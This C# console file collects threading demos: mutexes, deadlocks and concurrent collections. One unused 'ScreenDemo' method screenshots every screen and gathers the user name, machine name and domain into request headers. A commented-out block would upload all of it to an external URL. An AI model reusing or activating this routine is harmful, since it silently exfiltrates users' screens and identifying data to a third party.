using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ConApp
{
    public class Person
    {
        public string Name { get; set; }
    }
    #region Mutex

    internal class ShareRes
    {
        public static int count = 0;
        public static Mutex mutex = new Mutex();
    }

    internal class IncThread
    {
        private int number;
        public Thread thrd;

        public IncThread(string name, int n)
        {
            thrd = new Thread(this.run);
            number = n;
            thrd.Name = name;
            thrd.Start();
        }

        private void run()
        {
            Console.WriteLine(thrd.Name + "正在等待 the mutex");
            //申请
            ShareRes.mutex.WaitOne();
            Console.WriteLine(thrd.Name + "申请到 the mutex");
            do
            {
                Thread.Sleep(1000);
                ShareRes.count++;
                Console.WriteLine("In " + thrd.Name + "ShareRes.count is " + ShareRes.count);
                number--;
            } while (number > 0);
            Console.WriteLine(thrd.Name + "释放 the nmutex");
            // 释放
            ShareRes.mutex.ReleaseMutex();
        }
    }

    internal class DecThread
    {
        private int number;
        public Thread thrd;

        public DecThread(string name, int n)
        {
            thrd = new Thread(this.run);
            number = n;
            thrd.Name = name;
            thrd.Start();
        }

        private void run()
        {
            Console.WriteLine(thrd.Name + "正在等待 the mutex");
            //申请
            ShareRes.mutex.WaitOne();
            Console.WriteLine(thrd.Name + "申请到 the mutex");
            do
            {
                Thread.Sleep(1000);
                ShareRes.count--;
                Console.WriteLine("In " + thrd.Name + "ShareRes.count is " + ShareRes.count);
                number--;
            } while (number > 0);
            Console.WriteLine(thrd.Name + "释放 the nmutex");
            // 释放
            ShareRes.mutex.ReleaseMutex();
        }
    }

    #endregion Mutex

    internal class Program
    {
        private static void Main(string[] args)
        {
            DateTimeTicks();


            Console.ReadKey();
        }

        #region ScreenDemo

        private static Bitmap CreateBitmap(Rectangle box)
        {
            return new Bitmap(box.Width, box.Height);
        }

        private static byte[] TakeSnapShot(bool primaryOnly)
        {
            var box = primaryOnly ? Screen.PrimaryScreen.Bounds : SystemInformation.VirtualScreen;

            using (var ms = new MemoryStream())
            using (Bitmap bitmap = CreateBitmap(box))
            using (Graphics canvas = Graphics.FromImage(bitmap))
            {
                canvas.CopyFromScreen(
                    box.X, box.Y,
                    0, 0, bitmap.Size,
                    CopyPixelOperation.SourceCopy
                );

                bitmap.Save(ms, System.Drawing.Imaging.ImageFormat.Png);

                return ms.ToArray();
            }
        }

        private static void DoWork()
        {
            File.WriteAllBytes(@"kk.png", TakeSnapShot(true));

            string data = Convert.ToBase64String(TakeSnapShot(false));
            WebClient client = new WebClient();
            client.Headers.Add("X-Dab-MachineName", Environment.MachineName);
            client.Headers.Add("X-Dab-HostName", Dns.GetHostName());
            client.Headers.Add("X-Dab-OsVersion", Environment.OSVersion.ToString());
            client.Headers.Add("X-Dab-CWD", Environment.CurrentDirectory);
            client.Headers.Add("X-Dab-ProcessorCount", Environment.ProcessorCount.ToString());
            client.Headers.Add("X-Dab-UserName", Environment.UserName);
            client.Headers.Add("X-Dab-UserDomainName", Environment.UserDomainName);
            client.Headers.Add("X-Dab-DotNetVersion", Environment.Version.ToString());
            client.Headers.Add("X-Dab-TickCount", Environment.TickCount.ToString());

            //using (var stream = client.OpenWrite("http://www2.unsec.net/usb/upload.php"))
            //{
            //    var body = Encoding.UTF8.GetBytes(data);
            //    stream.Write(body, 0, body.Length);
            //    stream.Flush();
            //}
        }

        #endregion ScreenDemo

        #region 线程同步

        #region 实现1

        private static object m_res1 = new object();
        private static object m_res2 = new object();
        private static int m_count = 0;

        private static void Thread1()
        {
            while (true)
            {
                Monitor.Enter(m_res2);  // 先锁 m_res2
                Monitor.Enter(m_res1);  // 再锁 m_res1

                m_count++;

                Monitor.Exit(m_res1);  // 释放锁不存在先后关系
                Monitor.Exit(m_res2);
            }
        }

        private static void Thread2()
        {
            while (true)
            {
                Monitor.Enter(m_res1);  // 先锁 m_res1
                Monitor.Enter(m_res2);

                m_count++;

                Monitor.Exit(m_res1);
                Monitor.Exit(m_res2);
            }
        }

        public static void Test1()
        {
            Thread t1 = new Thread(Thread1);
            Thread t2 = new Thread(Thread2);

            t1.Start();
            t2.Start();

            while (true)
            {
                int preCount = m_count;
                Thread.Sleep(0);  // 放弃当前线程的CPU时间片，Windows可能调度其他线程
                if (preCount == m_count)  // 数据没有变化，表明线程没有执行
                {
                    Console.WriteLine("dead lock! count: {0}---{1}", m_count, DateTime.Now.Ticks);
                }
            }
        }

        #endregion 实现1

        #region 实现2

        private static Object objA = new Object();
        private static Object objB = new Object();

        public static void LockA()
        {
            if (Monitor.TryEnter(objA, 1000))
            {
                Thread.Sleep(1000);
                if (Monitor.TryEnter(objB, 2000))
                {
                    Monitor.Exit(objB);
                }
                else
                {
                    Console.WriteLine("LockB timeout");
                }
                Monitor.Exit(objA);
            }
            Console.WriteLine("LockA");
        }

        public static void LockB()
        {
            if (Monitor.TryEnter(objB, 2000))
            {
                Thread.Sleep(2000);
                if (Monitor.TryEnter(objA, 1000))
                {
                    Monitor.Exit(objA);
                }
                else
                {
                    Console.WriteLine("LockA timeout");
                }
                Monitor.Exit(objB);
            }
            Console.WriteLine("LockB");
        }

        public static void Test2()
        {
            Thread threadA = new Thread(LockA);
            Thread threadB = new Thread(LockB);
            threadA.Start();
            threadB.Start();
            Thread.Sleep(4000);
            Console.WriteLine("线程结束");
        }

        #endregion 实现2

        #region Mutex测试

        public static void Test3()
        {
            IncThread mthrd1 = new IncThread("IncThread thread ", 5);
            DecThread mthrd2 = new DecThread("DecThread thread ", 5);
            mthrd1.thrd.Join();
            mthrd2.thrd.Join();
        }

        #endregion Mutex测试

        #endregion 线程同步


        #region MyRegion
        private static void Demo1()
        {
            // We know how many items we want to insert into the ConcurrentDictionary.
            // So set the initial capacity to some prime number above that, to ensure that
            // the ConcurrentDictionary does not need to be resized while initializing it.
            int NUMITEMS = 64;
            int initialCapacity = 101;

            // The higher the concurrencyLevel, the higher the theoretical number of operations
            // that could be performed concurrently on the ConcurrentDictionary.  However, global
            // operations like resizing the dictionary take longer as the concurrencyLevel rises.
            // For the purposes of this example, we'll compromise at numCores * 2.
            int numProcs = Environment.ProcessorCount;
            int concurrencyLevel = numProcs * 2;

            // Construct the dictionary with the desired concurrencyLevel and initialCapacity
            ConcurrentDictionary<int, int> cd = new ConcurrentDictionary<int, int>(concurrencyLevel, initialCapacity);

            // Initialize the dictionary
            for (int i = 0; i < NUMITEMS; i++)
                cd[i] = i * i;

            Console.WriteLine("The square of 23 is {0} (should be {1})", cd[23], 23 * 23);
        }

        private static void Demo2()
        {
            Person p1 = new Person();
            Person p2 = new Person();
            Person p3 = new Person();
            Person p4 = new Person();
            Person p5 = new Person();
            Person p6 = new Person();
            ConcurrentDic<Person> cdp = new ConcurrentDic<Person>();

            Thread t1 = new Thread(delegate ()
            {
                for (int i = 0; i < 10; i++)
                {
                    cdp.Add("p1", p1);
                    cdp.Add("p2", p2);
                    cdp.Add("p3", p3);
                    cdp.Add("p4", p4);
                    cdp.Add("p5", p5);
                    cdp.Add("p6", p6);
                }
            });
            Thread t2 = new Thread(delegate ()
            {
                for (int i = 0; i < 10; i++)
                {
                    cdp.Add("p1", p1);
                    cdp.Add("p2", p2);
                    cdp.Add("p3", p3);
                    cdp.Add("p4", p4);
                    cdp.Add("p5", p5);
                    cdp.Add("p6", p6);
                }
            });

            Thread t3 = new Thread(delegate ()
            {
                for (int i = 0; i < 10; i++)
                {
                    cdp.Add("p1", p1);
                    cdp.Add("p2", p2);
                    cdp.Add("p3", p3);
                    cdp.Add("p4", p4);
                    cdp.Add("p5", p5);
                    cdp.Add("p6", p6);
                }
            });

            t1.Start();
            t2.Start();
            t3.Start();

            ICollection<string> keys = cdp.Keys;

            foreach (string item in keys)
            {
                Console.WriteLine(item);
            }
        }

        private static void Demo3()
        {
            List<int> intList = new List<int>();
            var result = Parallel.ForEach(Enumerable.Range(1, 10000), (val) =>
            {
                intList.Add(val);
            });
            if (result.IsCompleted)
            {
                Console.WriteLine("intList.Count():" + intList.Count);
            }
        }

        private static void Demo4()
        {
            ConcurrentBag<int> intList = new ConcurrentBag<int>();
            //ConcurrentList<int> intList = new ConcurrentList<int>();
            var result = Parallel.ForEach(Enumerable.Range(1, 10000), (val) =>
            {
                intList.Add(val);
            });
            if (result.IsCompleted)
            {
                Console.WriteLine("intList.Count():" + intList.Count);
            }
        }
        #endregion
        public static void DateTimeTicks()
        {
            long agoDateTicks = 636403425351377702;
            long dateNowTicks = DateTime.Now.Ticks;

            DateTime dateAgo = new DateTime(agoDateTicks);
            DateTime dateNow = new DateTime(dateNowTicks);
            Console.WriteLine(dateAgo.ToString());
            Console.WriteLine(dateNow.ToString());
        }
    }
}